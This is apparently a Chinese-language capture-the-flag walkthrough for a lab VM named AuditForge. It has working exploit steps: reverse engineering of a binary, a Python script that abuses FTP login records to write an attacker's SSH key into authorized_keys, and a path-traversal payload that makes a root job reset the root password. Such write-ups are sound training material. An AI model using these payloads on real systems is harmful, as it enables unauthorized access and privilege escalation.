# AuditForge

## Nmap

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p0-65535 192.168.205.210          
Starting Nmap 7.99 ( https://github.com/nmap/nmap ) at 2026-06-06 08:34 -0400
Nmap scan report for 192.168.205.210
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:75:51:9C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds
```

只有 `21/22/80`，先看 FTP 和 Web。

## FTP

FTP 的 banner 信息很多。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ftp 192.168.205.210
Connected to 192.168.205.210.
220-AuditForge legacy transfer node
220-Failed transfer records are mirrored for auditor review
220-Offline review is handled by the local auditor account "auditor"
220-Mirrored archives are later processed by reportfix-linux
220 Input format: USER <record_name>, PASS <record_body>, QUIT
Name (192.168.205.210:kali): anonymous
331 Password required
Password: 
530 Login incorrect
ftp: Login failed
```

这里可以先记住几个点：

```text
Failed transfer records are mirrored for auditor review
Offline review is handled by the local auditor account "auditor"
Mirrored archives are later processed by reportfix-linux
Input format: USER <record_name>, PASS <record_body>, QUIT
```

意思是 FTP 登录失败的记录会被保存，而且后面会由本地 `auditor` 用户处理，处理工具是 `reportfix-linux`。

## Web

访问 80：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.210
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>AuditForge Review Portal</title>
  <style>
    body { font-family: Georgia, serif; max-width: 820px; margin: 3rem auto; line-height: 1.7; color: #1f2933; }
    code { background: #eef2f7; padding: 0.1rem 0.3rem; }
    .note { border-left: 4px solid #3b5b92; padding-left: 1rem; color: #415166; }
  </style>
</head>
<body>
  <h1>AuditForge Review Portal</h1>
  <p>AuditForge stores legacy transfer authentication failures for internal review workflows.</p>
  <p class="note">If a mirrored archive looks malformed, internal auditors should use the local <code>reportfix</code> utility before escalating the incident.</p>

  <h2>Operator Links</h2>
  <ul>
    <li><a href="/help.php">help.php</a></li>
    <li><a href="/reports.php?name=index.txt">reports index</a></li>
    <li><a href="/downloads/reportfix-linux">download reportfix</a></li>
  </ul>
</body>
</html>
```

看 reports index：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.210/reports.php?name=index.txt'
available previews:
- failed-20260606.txt
- failed-20260606.meta
- failed-latest.txt
- failed-latest.meta
```

meta 文件里有真正关键的信息：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.210/reports.php?name=failed-latest.meta'
report_id=20260606-failed-auth
source=ftp_auth_failures
web_preview_mode=text
escaping=enabled
archive_format=AFR1
archive_name=daily.afr
next_consumer=reportfix-index@auditor.service
```

这里就能连起来：

```text
FTP authentication failure
=> daily.afr
=> reportfix-index@auditor.service
=> auditor
```

也就是 FTP 失败记录会进入 `daily.afr`，然后由 `reportfix-index@auditor.service` 处理。

## FTP record

先确认 FTP 的 USER/PASS 会不会进入报告。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ printf 'USER probe123\nPASS body456\nQUIT\n' | nc 192.168.205.210 21
220-AuditForge legacy transfer node
220-Failed transfer records are mirrored for auditor review
220-Offline review is handled by the local auditor account "auditor"
220-Mirrored archives are later processed by reportfix-linux
220 Input format: USER <record_name>, PASS <record_body>, QUIT
331 Password required
530 Login incorrect
221 Bye
```

然后看当天报告：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 'http://192.168.205.210/reports.php?name=failed-20260606.txt'
[2026-06-06T12:35:07.305142+00:00] 192.168.205.128
FAILED USER: kali
FAILED PASS: 

[2026-06-06T12:35:17.269860+00:00] 192.168.205.128
FAILED USER: anonymous
FAILED PASS: anonymous

[2026-06-06T12:40:02.981397+00:00] 192.168.205.128
FAILED USER: probe123
FAILED PASS: body456
```

可以看到 `probe123/body456` 已经进去了。

接下来测试 USER/PASS 的字符限制：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ printf 'USER T2onlyslash/x\r\nPASS p2\r\nQUIT\r\n' | nc 192.168.205.210 21
printf 'USER T3_dotdot..x\r\nPASS p3\r\nQUIT\r\n' | nc 192.168.205.210 21
printf 'USER T7_space here\r\nPASS p7\r\nQUIT\r\n' | nc 192.168.205.210 21
printf 'USER T8_semi;id\r\nPASS p8\r\nQUIT\r\n' | nc 192.168.205.210 21
```

报告里能看到原样记录：

```bash
[2026-06-06T12:44:04.450562+00:00] 192.168.205.128
FAILED USER: T2onlyslash/x
FAILED PASS: p2

[2026-06-06T12:44:04.480388+00:00] 192.168.205.128
FAILED USER: T3_dotdot..x
FAILED PASS: p3

[2026-06-06T12:44:04.567342+00:00] 192.168.205.128
FAILED USER: T7_space here
FAILED PASS: p7

[2026-06-06T12:44:04.597053+00:00] 192.168.205.128
FAILED USER: T8_semi;id
FAILED PASS: p8
```

PASS 里放 SSH 公钥格式也没问题：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ printf 'USER pass_test_1\r\nPASS ssh-ed25519 AAAA/BBB+CCC== user@host\r\nQUIT\r\n' | nc 192.168.205.210 21
```

报告结果：

```bash
[2026-06-06T12:44:12.502427+00:00] 192.168.205.128
FAILED USER: pass_test_1
FAILED PASS: ssh-ed25519 AAAA/BBB+CCC== user@host
```

所以 USER/PASS 基本都是可控的。

## reportfix

Web 页面提供了 reportfix 的下载地址，先拿下来分析。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget -O reportfix-linux http://192.168.205.210/downloads/reportfix-linux
```

看文件类型：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file reportfix-linux
reportfix-linux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4d19edc662e1b14d390b8ee52b6c4463f4283b7f, for GNU/Linux 3.2.0, not stripped
```

这里注意 `not stripped`，说明符号还在。

再看 strings：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings reportfix-linux
+lDc
/lib64/ld-linux-x86-64.so.2
fgets
snprintf
stdin
inet_addr
perror
strncpy
free
fread
fflush
htons
fopen
socket
strlen
stdout
strcspn
malloc
__libc_start_main
stderr
fprintf
memcmp
fclose
memset
fputc
fputs
connect
memcpy
fwrite
strcmp
libc.so.6
GLIBC_2.14
GLIBC_2.34
GLIBC_2.2.5
__gmon_start__
PTE1
reindex
fopen
AFR1
bad archive
bad count
bad record
127.0.0.1
== Maintenance Console ==
1. List profiles
2. Run custom profile
3. Exit
LIST
profile name: 
RUN %s
usage: %s --index <daily.afr> | --inspect <daily.afr>
--index
--inspect
current_user=%s
role=%c
active_profile=%s
maintenance features unavailable
;*3$"
GCC: (Debian 14.2.0-19) 14.2.0
crt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
reportfix.c
g_job
init_job
read_record
load_afr
maybe_export_key
send_command
maintenance_console
usage
```

这里有两个信息。

第一个是普通字符串：

```text
AFR1
--index
--inspect
RUN %s
127.0.0.1
```

说明它处理 `AFR1` 格式文件，并且有 `--index`、`--inspect` 两种模式。

第二个是函数符号：

```text
init_job
read_record
load_afr
maybe_export_key
send_command
maintenance_console
```

因为二进制没有 strip，所以函数名还在。后面分析 `read_record`、`maybe_export_key` 不是猜的，而是从这里来的。

也可以用这种方式确认符号：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ objdump -t reportfix-linux | grep -E 'read_record|load_afr|maybe_export_key|maintenance_console|send_command'
000000000040132b l     F .text  0000000000000244              read_record
000000000040156f l     F .text  0000000000000196              load_afr
0000000000401705 l     F .text  0000000000000080              maybe_export_key
0000000000401785 l     F .text  0000000000000146              send_command
00000000004018cb l     F .text  0000000000000178              maintenance_console
```

然后直接反汇编对应函数。

先看 `load_afr`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ objdump -d -M intel reportfix-linux | sed -n '/<load_afr>:/,/ret/p'
```

`load_afr` 里先读 4 字节 magic，并且和 `AFR1` 比较：

```asm
4015bb:       48 8b 55 f0             mov    rdx,QWORD PTR [rbp-0x10]
4015bf:       48 8d 45 ec             lea    rax,[rbp-0x14]
4015c3:       48 89 d1                mov    rcx,rdx
4015c6:       ba 04 00 00 00          mov    edx,0x4
4015cb:       be 01 00 00 00          mov    esi,0x1
4015d0:       48 89 c7                mov    rdi,rax
4015d3:       e8 88 fa ff ff          call   401060 <fread@plt>
4015d8:       48 83 f8 04             cmp    rax,0x4
4015dc:       75 1f                   jne    4015fd <load_afr+0x8e>
4015de:       48 8d 45 ec             lea    rax,[rbp-0x14]
4015e2:       ba 04 00 00 00          mov    edx,0x4
4015e7:       48 8d 0d 2b 0a 00 00    lea    rcx,[rip+0xa2b]        # 402019 <_IO_stdin_used+0x19>
4015ee:       48 89 ce                mov    rsi,rcx
4015f1:       48 89 c7                mov    rdi,rax
4015f4:       e8 37 fb ff ff          call   401130 <memcmp@plt>
```

后面读一个 2 字节 count，然后循环调用 `read_record`：

```asm
401636:       48 8b 55 f0             mov    rdx,QWORD PTR [rbp-0x10]
40163a:       48 8d 45 ea             lea    rax,[rbp-0x16]
401641:       ba 01 00 00 00          mov    edx,0x1
401646:       be 02 00 00 00          mov    esi,0x2
40164e:       e8 0d fa ff ff          call   401060 <fread@plt>

401697:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
40169b:       48 89 c7                mov    rdi,rax
40169e:       e8 88 fc ff ff          call   40132b <read_record>
```

所以 AFR 格式开头就是：

```text
AFR1 + uint16_le count + records
```

再看 `read_record`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ objdump -d -M intel reportfix-linux | sed -n '/<read_record>:/,/ret/p'
```

这个函数前面读了 1 字节、1 字节、2 字节：

```asm
401355:       48 8b 55 d8             mov    rdx,QWORD PTR [rbp-0x28]
401359:       48 8d 45 ef             lea    rax,[rbp-0x11]
401360:       ba 01 00 00 00          mov    edx,0x1
401365:       be 01 00 00 00          mov    esi,0x1
40136d:       e8 ee fc ff ff          call   401060 <fread@plt>

401382:       48 8b 55 d8             mov    rdx,QWORD PTR [rbp-0x28]
401386:       48 8d 45 ee             lea    rax,[rbp-0x12]
40138d:       ba 01 00 00 00          mov    edx,0x1
401392:       be 01 00 00 00          mov    esi,0x1
40139a:       e8 c1 fc ff ff          call   401060 <fread@plt>

4013af:       48 8b 55 d8             mov    rdx,QWORD PTR [rbp-0x28]
4013b3:       48 8d 45 ec             lea    rax,[rbp-0x14]
4013ba:       ba 01 00 00 00          mov    edx,0x1
4013bf:       be 02 00 00 00          mov    esi,0x2
4013c7:       e8 94 fc ff ff          call   401060 <fread@plt>
```

然后根据第二个字段和第三个字段 malloc，再分别读取 key 和 body。

关键是它把 key 拷贝到了 `g_job`，body 拷贝到了 `g_job+0xc2`：

```asm
4014eb:       0f b6 45 ee             movzx  eax,BYTE PTR [rbp-0x12]
4014ef:       0f b6 d0                movzx  edx,al
4014f2:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
4014f6:       48 89 c6                mov    rsi,rax
4014f9:       48 8d 05 40 2c 00 00    lea    rax,[rip+0x2c40]        # 404140 <g_job>
401500:       48 89 c7                mov    rdi,rax
401503:       e8 78 fc ff ff          call   401180 <memcpy@plt>

401528:       0f b7 45 ec             movzx  eax,WORD PTR [rbp-0x14]
40152c:       ba 9f 00 00 00          mov    edx,0x9f
401531:       66 39 d0                cmp    ax,dx
401534:       0f 47 c2                cmova  eax,edx
401537:       0f b7 d0                movzx  edx,ax
40153a:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
40153e:       48 89 c6                mov    rsi,rax
401541:       48 8d 05 ba 2c 00 00    lea    rax,[rip+0x2cba]        # 404202 <g_job+0xc2>
401548:       48 89 c7                mov    rdi,rax
40154b:       e8 30 fc ff ff          call   401180 <memcpy@plt>
```

这里就可以还原：

```text
AFR record:
  1 byte   tag
  1 byte   key length
  2 bytes  body length, uint16_le
  key
  body
```

对应关系：

```text
key  -> g_job+0x00
body -> g_job+0xc2
```

这里有两个长度限制需要注意：

```text
key length 是 1 字节，所以理论上 key 最大 255 字节。

body 拷贝时有：
  cmp ax, 0x9f
  cmova eax, edx

所以 body 写入 g_job+0xc2 时最多拷贝 0x9f = 159 字节。
因此建议选 ed25519 公钥，不然超了可能失败。
```

然后看 `maybe_export_key`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ objdump -d -M intel reportfix-linux | sed -n '/<maybe_export_key>:/,/ret/p'
```

关键代码：

```asm
40170d:       0f b6 05 6c 2a 00 00    movzx  eax,BYTE PTR [rip+0x2a6c]        # 404180 <g_job+0x40>
401714:       84 c0                   test   al,al
401716:       74 64                   je     40177c <maybe_export_key+0x77>

401718:       0f b6 05 63 2a 00 00    movzx  eax,BYTE PTR [rip+0x2a63]        # 404182 <g_job+0x42>
40171f:       84 c0                   test   al,al
401721:       74 5c                   je     40177f <maybe_export_key+0x7a>

401723:       48 8d 05 18 09 00 00    lea    rax,[rip+0x918]        # 402042 <_IO_stdin_used+0x42>
40172a:       48 89 c6                mov    rsi,rax
40172d:       48 8d 05 4e 2a 00 00    lea    rax,[rip+0x2a4e]        # 404182 <g_job+0x42>
401734:       48 89 c7                mov    rdi,rax
401737:       e8 74 fa ff ff          call   4011b0 <fopen@plt>

401747:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
40174b:       48 89 c6                mov    rsi,rax
40174e:       48 8d 05 ad 2a 00 00    lea    rax,[rip+0x2aad]        # 404202 <g_job+0xc2>
401755:       48 89 c7                mov    rdi,rax
401758:       e8 73 f9 ff ff          call   4010d0 <fputs@plt>
```

逻辑就是：

```c
if (g_job[0x40] != 0 && g_job[0x42] != 0) {
    fp = fopen(g_job + 0x42, "w");
    fputs(g_job + 0xc2, fp);
}
```

结合前面的 FTP 记录：

```text
FTP USER -> AFR key  -> g_job+0x00
FTP PASS -> AFR body -> g_job+0xc2
```

所以可以控制文件名和文件内容。

要让 `g_job+0x42` 变成目标文件路径，USER 要这样构造：

```text
0x00-0x3f: A * 64
0x40: 任意非 0 字符
0x41: 任意字符
0x42: 文件路径
```

也就是：

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMM/home/auditor/.ssh/authorized_keys
```

PASS 放自己的 SSH 公钥。

## User

生成 SSH key：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh-keygen -t ed25519 -f /tmp/pwn_key -N '' -q
```

发 payload：

```python
import socket
pad=b'A'*0x40
flags=b'MM'
path=b'/home/auditor/.ssh/authorized_keys'
user=pad+flags+path
pub=open('/tmp/pwn_key.pub','rb').read().strip()
s=socket.socket()
s.connect(('192.168.205.210',21))
s.recv(4096)
s.send(b'USER '+user+b'\r\n')
s.recv(1024)
s.send(b'PASS '+pub+b'\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
s.close()
```

运行以后看报告：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py
```

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -s http://192.168.205.210/reports.php?name=failed-20260606.txt
[2026-06-06T12:47:30.116997+00:00] 192.168.205.128
FAILED USER: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMM/home/auditor/.ssh/authorized_keys
FAILED PASS: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxABKhF07LrRTdrU4tHJ6vtZckjPWk4R6IxnPxqAj6y kali@kali
```

等 `reportfix-index@auditor.service` 跑完后 SSH 登录。

> 这里能成功是因为靶机中 `/home/auditor/.ssh/` 已存在；如果目录不存在，单纯 `fopen` 无法创建多级目录，需要换其他落点或找能创建目录的方式。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh -i /tmp/pwn_key auditor@192.168.205.210
Linux AuditForge 7.0.5-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.0-4.1~trixie (2026-05-08) x86_64
AuditForge Internal Review Appliance

- Legacy transfer review is mirrored for auditors.
- Malformed daily archives should be checked with reportfix.
- Maintenance queue is local-only on 127.0.0.1:1314.
Last login: Thu May 21 05:49:30 2026 from 192.168.56.1

AuditForge :: 192.168.205.210

auditor@AuditForge:~$ id
uid=1000(auditor) gid=1000(auditor) groups=1000(auditor)
```

拿 user：

```bash
auditor@AuditForge:~$ cat user.txt 
flag{user-a7cf56e3cc7f91abff273524b6ef13e5}
```

## Root

先看 notes：

```bash
auditor@AuditForge:~/notes$ cat reportfix_usage.txt 
reportfix operator note

If the daily report parser fails, run the local reportfix utility to inspect the archive and refresh the maintenance index.

Operators usually work with files in:
- /home/auditor/inbox/
- localhost:1314 maintenance queue
```

这里提示了本地 `1314` maintenance queue。

看 systemd 服务：

```bash
auditor@AuditForge:~/inbox$ systemctl list-units --type=service | grep -Ei 'report|audit|maint'
  auditforge-ftp.service                   loaded active running AuditForge legacy FTP collector
  auditforge-maint.service                 loaded active running AuditForge maintenance queue service
  auditforge-web.service                   loaded active running AuditForge offline web service
```

再看 timer：

```bash
auditor@AuditForge:~/inbox$ systemctl list-timers
NEXT                             LEFT LAST                              PASSED UNIT                          ACTIVATES                  
Sat 2026-06-06 08:49:42 EDT        4s Sat 2026-06-06 08:49:22 EDT      15s ago auditforge-runner.timer       auditforge-runner.service
Sat 2026-06-06 08:50:22 EDT       44s Sat 2026-06-06 08:49:22 EDT      15s ago auditforge-builder.timer      auditforge-builder.service
Sat 2026-06-06 08:50:22 EDT       44s Sat 2026-06-06 08:49:22 EDT      15s ago reportfix-index-auditor.timer reportfix-index@auditor.service
```

有一个 `auditforge-runner.timer`，后面应该会用来消费 queue。

先看 `auditforge-maint.service`：

```bash
auditor@AuditForge:~/inbox$ cat /etc/systemd/system/auditforge-maint.service
[Unit]
Description=AuditForge maintenance queue service
After=network.target

[Service]
Type=simple
User=reportsvc
Group=reportsvc
ExecStart=/usr/bin/python3 /opt/auditforge/bin/auditd-helper.py
Restart=always

[Install]
WantedBy=multi-user.target
```

这个服务是 `reportsvc` 跑的，不是 root。

连接本地 1314：

```bash
auditor@AuditForge:~/inbox$ echo 'LIST' | busybox nc 127.0.0.1 1314
reindex
repair-perms
refresh-hooks
```

```bash
auditor@AuditForge:~/inbox$ echo 'RUN test' | busybox nc 127.0.0.1 1314
QUEUED
```

直接命令注入不行：

```bash
auditor@AuditForge:~/inbox$ echo 'RUN ;id > /tmp/rce_test' | busybox nc 127.0.0.1 1314
QUEUED
auditor@AuditForge:~/inbox$ cat /tmp/rce_test
cat: /tmp/rce_test: No such file or directory
```

所以看服务代码：

```bash
auditor@AuditForge:~/inbox$ cat /opt/auditforge/bin/auditd-helper.py
#!/usr/bin/env python3
import json
import socketserver
import time
from pathlib import Path

QUEUE = Path('/opt/auditforge/runtime/queue')
PROFILES = ['reindex', 'repair-perms', 'refresh-hooks']


class Handler(socketserver.StreamRequestHandler):
    def handle(self):
        line = self.rfile.readline(4096).decode('utf-8', errors='ignore').strip()

        if line == 'LIST':
            self.wfile.write(('\n'.join(PROFILES) + '\n').encode())
            return

        if line.startswith('RUN '):
            profile = line.split(' ', 1)[1]
            QUEUE.mkdir(parents=True, exist_ok=True)
            req = QUEUE / f'{int(time.time() * 1000)}.json'
            req.write_text(json.dumps({'profile': profile}), encoding='utf-8')
            self.wfile.write(b'QUEUED\n')
            return

        self.wfile.write(b'UNKNOWN\n')


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


if __name__ == '__main__':
    with Server(('127.0.0.1', 1314), Handler) as server:
        server.serve_forever()
```

可以看到它只是把 profile 写到 `/opt/auditforge/runtime/queue`，没有执行命令。

真正执行的是 runner。

```bash
auditor@AuditForge:~/inbox$ cat /etc/systemd/system/auditforge-runner.service
[Unit]
Description=AuditForge maintenance runner

[Service]
Type=oneshot
ExecStart=/usr/bin/python3 /usr/local/sbin/audit-maint-runner.py
```

没有指定 `User=`，所以 systemd 默认 root 执行。

看 runner 脚本：

```bash
auditor@AuditForge:~/inbox$ cat /usr/local/sbin/audit-maint-runner.py
#!/usr/bin/env python3
import json
import subprocess
from pathlib import Path

QUEUE = Path('/opt/auditforge/runtime/queue')
BASE = Path('/opt/auditforge/profiles')


def main() -> None:
    QUEUE.mkdir(parents=True, exist_ok=True)
    for req in sorted(QUEUE.glob('*.json')):
        data = json.loads(req.read_text(encoding='utf-8'))
        profile = str(data.get('profile', 'reindex')).strip() or 'reindex'
        script = BASE / profile / 'apply.sh'
        subprocess.run(['/bin/bash', str(script)], check=False)
        req.unlink(missing_ok=True)


if __name__ == '__main__':
    main()
```

漏洞点很明显：

```python
profile = str(data.get('profile', 'reindex')).strip() or 'reindex'
script = BASE / profile / 'apply.sh'
subprocess.run(['/bin/bash', str(script)], check=False)
```

profile 没有过滤，直接拼到路径里。

正常 profile 在这里：

```bash
auditor@AuditForge:~/inbox$ ls -la /opt/auditforge/profiles/
total 20
drwxr-xr-x 5 root root 4096 May 21 05:49 .
drwxr-xr-x 7 root root 4096 May 21 05:49 ..
drwxr-xr-x 2 root root 4096 May 21 05:49 refresh-hooks
drwxr-xr-x 2 root root 4096 May 21 05:49 reindex
drwxr-xr-x 2 root root 4096 May 21 05:49 repair-perms
```

比如 `reindex`：

```bash
auditor@AuditForge:~/inbox$ cat /opt/auditforge/profiles/reindex/apply.sh
#!/bin/bash
echo '[*] reindex complete' >/dev/null
```

同时 auditor 有一个可写目录：

```bash
auditor@AuditForge:~/inbox$ ls -la /home/auditor/.local/share/reportfix/
total 12
drwxr-xr-x 3 auditor auditor 4096 May 21 05:49 .
drwxr-xr-x 3 auditor auditor 4096 May 21 05:49 ..
drwxr-xr-x 2 auditor auditor 4096 May 21 05:50 profiles
```

因此可以让 profile 等于：

```text
../../../../home/auditor/.local/share/reportfix/profiles/pwn
```

最终 root 执行的是：

```text
/opt/auditforge/profiles/../../../../home/auditor/.local/share/reportfix/profiles/pwn/apply.sh
```

也就是 auditor 可控的文件。

创建恶意 profile：

```bash
auditor@AuditForge:~$ mkdir -p /home/auditor/.local/share/reportfix/profiles/pwn
auditor@AuditForge:~$ vim /home/auditor/.local/share/reportfix/profiles/pwn/apply.sh
auditor@AuditForge:~$ cat $_
#!/bin/bash
echo 'root:root123' | chpasswd
auditor@AuditForge:~$ chmod +x /home/auditor/.local/share/reportfix/profiles/pwn/apply.sh
```

触发：

```bash
auditor@AuditForge:~$ echo 'RUN ../../../../home/auditor/.local/share/reportfix/profiles/pwn' | busybox nc 127.0.0.1 1314
QUEUED
```

等 timer 执行后切 root：

```bash
auditor@AuditForge:~$ su - root
Password: root123
```

成功 root：

```bash
root@AuditForge:~# id
uid=0(root) gid=0(root) groups=0(root)
```

读 root flag：

```bash
root@AuditForge:~# cat /root/root.txt
flag{root-a5f5224161a85bd9f3d36d1c27f53d62}
```